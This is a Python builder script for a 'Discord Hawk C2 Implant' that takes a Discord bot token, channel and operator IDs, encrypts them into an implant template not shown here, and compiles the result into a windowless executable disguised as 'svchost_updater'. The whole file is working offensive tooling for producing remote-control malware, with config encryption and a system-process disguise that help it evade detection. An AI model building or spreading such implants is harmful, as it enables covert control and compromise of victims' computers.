# builder.py
import json
import os
import base64
import sys
import subprocess
from crypto_utils import encrypt_data


def main():

    BANNER = r"""


    ▓█████▄  ██▓  ██████  ▄████▄   ▒█████   ██▀███  ▓█████▄     ██░ ██  ▄▄▄       █     █░██ ▄█▀
    ▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌   ▓██░ ██▒▒████▄    ▓█░ █ ░█░██▄█▒ 
    ░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌   ▒██▀▀██░▒██  ▀█▄  ▒█░ █ ░█▓███▄░ 
    ░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌   ░▓█ ░██ ░██▄▄▄▄██ ░█░ █ ░█▓██ █▄ 
    ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓    ░▓█▒░██▓ ▓█   ▓██▒░░██▒██▓▒██▒ █▄
     ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒     ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▓░▒ ▒ ▒ ▒▒ ▓▒
     ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒     ▒ ░▒░ ░  ▒   ▒▒ ░  ▒ ░ ░ ░ ░▒ ▒░
     ░ ░  ░  ▒ ░░  ░  ░  ░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░     ░  ░░ ░  ░   ▒     ░   ░ ░ ░░ ░ 
       ░     ░        ░  ░ ░          ░ ░     ░        ░        ░  ░  ░      ░  ░    ░   ░  ░   
     ░                   ░                           ░                                          
    
    """

    print(BANNER)
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║              Discord Hawk C2 Implant Builder         ║
    ║        Developer: Muhammad Shahzaib (CyberKnight)    ║
    ║              GitHub: m-shahzaib5911                  ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    # Gather credentials
    bot_token = input("Discord Bot Token: ").strip()
    channel_id = input("Channel ID: ").strip()
    allowed_users = input("Your User ID (comma-separated if multiple): ").strip()
    user_list = [uid.strip() for uid in allowed_users.split(",") if uid.strip()]

    config = {
        "bot_token": bot_token,
        "channel_id": channel_id,
        "allowed_users": user_list
    }

    # 1. Generate a random 32-byte key
    random_key = os.urandom(32)
    key_b64 = base64.b64encode(random_key).decode('utf-8')
    print("[+] Random AES-256 key generated.")

    # 2. Encrypt the config with that key
    encrypted_blob = encrypt_data(json.dumps(config), random_key)
    print("[+] Config encrypted with random key.")

    # 3. Load the implant template
    if not os.path.exists("implant_template.py"):
        print("[!] implant_template.py not found. Place it in the same folder.")
        return

    with open("implant_template.py", "r", encoding="utf-8") as f:
        template = f.read()

    # 4. Inject the encrypted config AND the random key into the template
    final_code = template.replace("ENCRYPTED_CONFIG = ''",
                                  f"ENCRYPTED_CONFIG = '{encrypted_blob}'")
    final_code = final_code.replace("IMPLANT_KEY = ''",
                                    f"IMPLANT_KEY = '{key_b64}'")

    # 5. Write the generated source
    generated_filename = "_generated_implant.py"
    with open(generated_filename, "w", encoding="utf-8") as f:
        f.write(final_code)
    print(f"[+] Generated source written to {generated_filename}")

    # 6. Compile to .exe with PyInstaller
    print("[+] Building .exe with PyInstaller...")
    exe_name = "svchost_updater"

    subprocess.run([
        "pyinstaller",
        "--onefile",
        "--noconsole",
        f"--name={exe_name}",
        generated_filename
    ], check=True)

    print(f"[+] Done! Implant is in dist/{exe_name}.exe")

    # Optional cleanup
    # os.remove(generated_filename)


if __name__ == "__main__":
    main()